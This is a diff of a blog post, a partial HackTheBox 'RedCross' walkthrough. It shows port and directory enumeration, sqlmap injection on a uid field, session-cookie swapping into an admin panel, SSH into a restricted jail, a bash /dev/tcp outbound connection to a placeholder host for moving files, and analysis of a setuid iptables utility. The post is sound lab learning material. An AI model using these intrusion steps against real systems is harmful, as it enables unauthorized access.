@@ -5,25 +5,27 @@ draft = false
 tags = ["HackTheBox", "RedCross", "snoom", "hacking", "root"]
 categories = []
 +++
-This is a writeup for the new machine released on HackTheBox, named 'RedCross'.
+This is a writeup for the new machine released on HackTheBox, named 'RedCross', and the first post on my new blog/website/ramblings!
 
 HackTheBox is something I have recently begun to partake in, a friend has completed quite a chunk of the machines
-and piqued my interest in it. I will be writing up the interesting machines as I make my way through them.
+and piqued my interest in it. I will be writing up the interesting machines as I make my way through them and find the time.
 
-I must give him credit for this post also - as I did not complete this solo. We worked through this machine together (mostly him, I can't deny his skills), for the sake of anonymity I will call him X throughout this post.
+#### **If you dont want spoilers, turn away now!**
+
+I must give my friend credit for this post also - as I did not complete this solo. We worked through this machine together (mostly him, I can't deny his skills), for the sake of anonymity I will call him friend throughout this post.
 
 
 ## Enumeration
 ---
 
-As always, the first stage is to enumerate the machine.
+As always, the first stage is to enumerate the machine. Initially, we fire off an nmap scan of the box in order to externally exposed services that we can interact with.
 
 
 #### Nmap 
 ---
 
 ```
-root@pwnbox:~/redcross_snoom# nmap -sS -sV -p- -v 10.10.10.113
+root@pwnbox:~# nmap -sS -sV -p- -v 10.10.10.113
 Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-16 15:26 GMT
 NSE: Loaded 43 scripts for scanning.
 Initiating Ping Scan at 15:26
@@ -45,15 +47,16 @@ Service Info: Host: redcross.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
 
-Standard ports are visible: 80, 443 and 22. 
+Not much is available, two webserver ports (both running the same version) and an ssh server: 80, 443 & 22. 
 
 
 #### Webserver
 ---
 
-Attempting to visit HTTP port 80 redirects us to hxxps://intra.redcross.htb/
+Attempting to visit HTTP port 80 redirects us to `https://intra.redcross.htb/`
 
-```root@pwnbox:~/redcross_snoom# curl http://10.10.10.113/
+```
+root@pwnbox:~# curl http://10.10.10.113/
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 <html><head>
 <title>301 Moved Permanently</title>
@@ -69,14 +72,12 @@ The information which stands out through this redirect, is that the 301 doesn't 
 
 In order to access the site, we added a record to our local hosts file.
 
-```
-10.10.10.113	intra.redcross.htb
-```
+`10.10.10.113	intra.redcross.htb`
 
 Now we could visit the site through a browser, where we are greeted with a standard login portal. The standard CTF-style attempts of basic usernames and passwords were attempted, admin:admin, admin:password, redcross:redcross etc netted zero gain. Further enumeration was needed!
 
 
-&nbsp;&nbsp;<center><img src="rcross_intra_main.png" width="600"></center>&nbsp;&nbsp;
+&nbsp;&nbsp;<center><img src="rcross_intra_main.jpg" width="600"></center>&nbsp;&nbsp;
 
 
 #### Nikto
@@ -142,10 +143,10 @@ Gobuster v2.0.0              OJ Reeves (@TheColonial)
 =====================================================
 ```
 
-hxxps://intra.redcross.htb/documentation stood out as something worth looking into, however bruteforce attempts were fruitless. In order to attempt a different approach, X suggested that a typical documentation extension was added to the files. Another wordlist with the _pdf_ extension gave us the path: hxxps://intra.redcross.htb/documentation/**account-signup.pdf**
+`hxxps://intra.redcross.htb/documentation` stood out as something worth looking into, however bruteforce attempts were fruitless. In order to attempt a different approach, X suggested that a typical documentation extension was added to the files. Another wordlist with the _pdf_ extension gave us the path: hxxps://intra.redcross.htb/documentation/**account-signup.pdf**
 
 
-&nbsp;&nbsp;<center><img src="signup_pdf.png" width="600"></center>&nbsp;&nbsp;
+&nbsp;&nbsp;<center><img src="signup_pdf.jpg" width="600"></center>&nbsp;&nbsp;
 
 ## Foothold
 ---
@@ -165,10 +166,10 @@ DOMAIN=intra... Hmm.
 The site was rather basic once access was gained. Some form of database holding messages sent to the particular logged in user.
 
 
-&nbsp;&nbsp;<center><img src="main_page.png" width="600"></center>&nbsp;&nbsp; 
+&nbsp;&nbsp;<center><img src="main_page.jpg" width="600"></center>&nbsp;&nbsp; 
 
 
-Quick enumeration of the page revealed an injection point within the uid field. SQLMap time! (mostly snipped out)
+Quick enumeration of the page revealed an injection point within the uid field. SQLMap time! (mostly snipped out). A delay was added as through the initial enumeration phase, the server appeared to blacklist IPs when it was being hammered a bit too hard.
 
 ```
 root@pwnbox:~# sqlmap -p o -r rc_mainpage --delay=0.5 --dbs
@@ -240,11 +241,170 @@ Filtered Requests: 4609
 Requests/sec.: 69.44898
 ```
 
-Requesting this page gave us another login portal, the login charles gave us an "Incorrect privileges" message! What if we could swap out the _guest_ session from the main page?  
+Requesting this page gave us another login portal, the login charles gave us an "Not enough privileges!" message... What if we could swap out the _guest_ session cookie from the main page?  
 
 
-&nbsp;&nbsp;<center><img src="admin_panel.png" width="600"></center>&nbsp;&nbsp;
+&nbsp;&nbsp;<center><img src="admin_panel.jpg" width="600"></center>&nbsp;&nbsp;
 
 
-Winner winner, chicken dinner!
+Winner winner, chicken dinner! From here there are two sections to the admin panel, User Management and Network Access.  Let's take a look at User Management first.
 
+Another basic page is displayed with limited input fields, an option to add a "Virtual user". Doing this provides us with credentials:
+
+```
+Provide this credentials to the user:
+
+Test : HEUJnn4k
+
+Continue
+``` 
+
+Coming back to the User Management page now shows us our added account, _Test_, a UID and a GID and an action to delete the user. There appear to be no vulnerabilities that can leverage us access to the system.
+
+## Don't Drop the Soap 
+---
+
+As we now have credentials, as well as user ID and group ID, my friend X and I go to jail.
+
+```
+root@pwnbox:~# ssh Test@10.10.10.113
+Test@10.10.10.113's password: 
+Linux redcross 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+$ whoami && id
+whoami: cannot find name for user ID 2662
+$ pwd
+/
+$ ls
+bin  dev  etc  home  lib  lib64  root  usr
+$ env | grep -i path
+-bash: grep: command not found
+-bash: env: command not found
+$ ls bin
+bash  cat  id  ls  mkdir  vim  vim.tiny  whoami
+$ /bin/bash
+bash-4.4$ set
+BASH=/bin/bash
+BASHOPTS=cmdhist:complete_fullquote:expand_aliases:extquote:force_fignore:hostcomplete:interactive_comments:progcomp:promptvars:sourcepath
+BASH_ALIASES=()
+BASH_ARGC=()
+BASH_ARGV=()
+BASH_CMDS=()
+BASH_LINENO=()
+BASH_SOURCE=()
+BASH_VERSINFO=([0]="4" [1]="4" [2]="12" [3]="1" [4]="release" [5]="x86_64-pc-linux-gnu")
+BASH_VERSION='4.4.12(1)-release'
+COLUMNS=80
+DIRSTACK=()
+EUID=2662
+GROUPS=()
+HISTFILE=/var/jail/home/.bash_history
+HISTFILESIZE=500
+HISTSIZE=500
+HOME=/var/jail/home
+HOSTNAME=redcross
+HOSTTYPE=x86_64
+IFS=$' \t\n'
+LANG=en_US.UTF-8
+LINES=24
+LOGNAME=Test
+MACHTYPE=x86_64-pc-linux-gnu
+MAIL=/var/mail/Test
+MAILCHECK=60
+OPTERR=1
+OPTIND=1
+OSTYPE=linux-gnu
+PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+PIPESTATUS=([0]="127")
+PPID=10959
+PS1='\s-\v\$ '
+PS2='> '
+PS4='+ '
+PWD=/
+SHELL=/bin/bash
+SHELLOPTS=braceexpand:emacs:hashall:histexpand:history:interactive-comments:monitor
+SHLVL=2
+SSH_CLIENT='10.10.13.xx 55822 22'
+SSH_CONNECTION='10.10.13.xx 55822 10.10.10.113 22'
+SSH_TTY=/dev/pts/7
+TERM=xterm-256color
+UID=2662
+USER=Test
+_=env
+bash-4.4$ 
+```
+
+We gained some more information about the machine:
+
+`Linux redcross 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64`
+
+My friend worked on this jail for a good few hours, we found that we could utilise bash `/dev/tcp/x.x.x.x/yy` in order to establish a connection out and subsequently moves files into and out of the jail. He added BusyBox, chmod and a few other essential administrative files. There was also another critical piece of information held within this jail, source code for a utility named `iptctl` -- (Find it here: <a href="iptctl.c">iptctl.c</a>) 
+
+My friend had built up quite an environment within this jail, however many of the attempts to break out of it were met with dead ends and stares of frustration at the terminal in front of us. Exploits failed, it seemed very well locked down.
+
+#### IptCtl Analysis
+---
+
+Upon viewing the file, the header gives a brief but succinct description of the tool. 
+
+``` c
+/*
+ * Small utility to manage iptables, easily executable from admin.redcross.htb
+ * v0.1 - allow and restrict mode
+ * v0.3 - added check method and interactive mode (still testing!)
+ */
+```
+
+Considering the other section of the admin control panel is "Network Access", it's clear we have access to execute this binary from there, it also must have suid set in order to manage iptables. Let's continue the analysis before we delve into the network access panel.
+
+The file takes a second argument of the following 3 options: allow, restrict, show and a final argument of the IP address in question.
+
+The IP address is validated using the function `isValidIpAddress()`:
+``` c
+int isValidIpAddress(char *ipAddress)
+{
+	struct sockaddr_in sa;
+	int result = inet_pton(AF_INET, ipAddress, &(sa.sin_addr));
+	return result != 0;
+}
+```
+
+The function `inet_pton()` takes a string form network address and converts it to the binary form for use with a socket, an error occurs `if the string does not contain a character string representing a valid network address` (man inet_pton).
+
+The server application definitely has some form of server-side checks on the IP address supplied, and this is on the application, not the web application which will execute the binary.
+
+#### Execution of IPTables
+---
+
+``` c
+puts("DEBUG: All checks passed... Executing iptables");
+if(isAction==1) cmdAR(args,"-A",inputAddress);
+if(isAction==2) cmdAR(args,"-D",inputAddress);
+if(isAction==3) cmdShow(args);
+	
+child_pid=fork();
+if(child_pid==0){
+	setuid(0);
+	execvp(args[0],args);
+	exit(0);
+}
+else{
+	if(isAction==1) printf("Network access granted to %s\n",inputAddress);
+	if(isAction==2) printf("Network access restricted to %s\n",inputAddress);
+	if(isAction==3) puts("ERR: Function not available!\n");
+}
+```
+
+If the IP address supplied is valid, as well as the "action" (argument) being valid, a message is printed that the checks have passed and that IPTables will be executed.   
+
+The function `cmdAR()` is then used to build the arguments array, in order to pass through to `execvp()`. This essentially swaps in the IP address and subsequent delete or add rule flag (-D | -A) to the arguments list.  
+
+The binary forks itself, elevates its privileges to root and executes the command. and displays a message to stdout before exiting. 
+
+## Write up not complete yet for visitors who have found my site. Soon :)
